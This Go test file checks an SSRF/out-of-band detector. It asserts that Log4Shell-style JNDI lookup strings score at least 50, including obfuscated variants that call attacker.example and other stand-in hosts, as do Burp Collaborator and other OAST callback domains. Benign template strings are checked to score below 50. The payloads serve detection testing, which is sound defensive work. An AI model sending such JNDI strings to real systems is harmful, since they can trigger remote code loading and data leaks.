package ssrf

import "testing"

func oobTotal(in string) int {
	t := 0
	for _, f := range Detect(in, "query") {
		t += f.Score
	}
	return t
}

func TestOutOfBand(t *testing.T) {
	for _, a := range []string{
		`${jndi:ldap://attacker.example/a}`,
		`${JNDI:rmi://x.example/y}`,
		`${${lower:j}ndi:ldap://x.example/a}`,
		`${${::-j}${::-n}${::-d}${::-i}:ldap://x.example/a}`,
		`${${env:NaN:-j}ndi${env:NaN:-:}ldap://x.example/a}`,
		`http://abc123.burpcollaborator.net/x`,
		`abc.oast.me`,
		`x.oastify.com/6.17.0.RELEASE iPhone12,8`,
		`h.interact.sh`,
	} {
		if got := oobTotal(a); got < 50 {
			t.Errorf("Detect(%q) = %d, want >= 50", a, got)
		}
	}
	for _, b := range []string{
		`${user.name} is the user`,
		`${HOME}/bin`,
		`join me at example.com or oast-fan.net`,
		`burpcollaborator is a Burp feature`,
		`my interact.shop sells things`,
		`price: ${price}`,
	} {
		if got := oobTotal(b); got >= 50 {
			t.Errorf("Detect(%q) = %d, want < 50", b, got)
		}
	}
}
